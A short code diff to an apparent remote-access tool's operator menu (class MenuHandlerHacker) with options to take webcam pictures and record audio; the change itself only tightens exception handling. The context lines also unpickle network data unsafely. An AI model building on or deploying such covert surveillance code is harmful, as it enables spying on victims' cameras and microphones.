@@ -39,7 +39,7 @@ class MenuHandlerHacker(threading.Thread):
 					self.connection.socket_interact.send(option)
 					option = pickle.loads(option)
 					option = b64decode(option).decode()
-				except:
+				except Exception:
 					break
 			elif option == '2':
 				self.logger.info('Taking webcam picture...')
@@ -49,7 +49,7 @@ class MenuHandlerHacker(threading.Thread):
 					self.connection.socket_interact.send(option)
 					option = pickle.loads(option)
 					option = b64decode(option).decode()
-				except:
+				except Exception:
 					break
 			elif option == '3':
 				self.logger.info('Recording audio...')
@@ -59,7 +59,7 @@ class MenuHandlerHacker(threading.Thread):
 					self.connection.socket_interact.send(option)
 					option = pickle.loads(option)
 					option = b64decode(option).decode()
-				except:
+				except Exception:
 					break
 			elif option == '4':
 				self.logger.info("Closing the connection...")
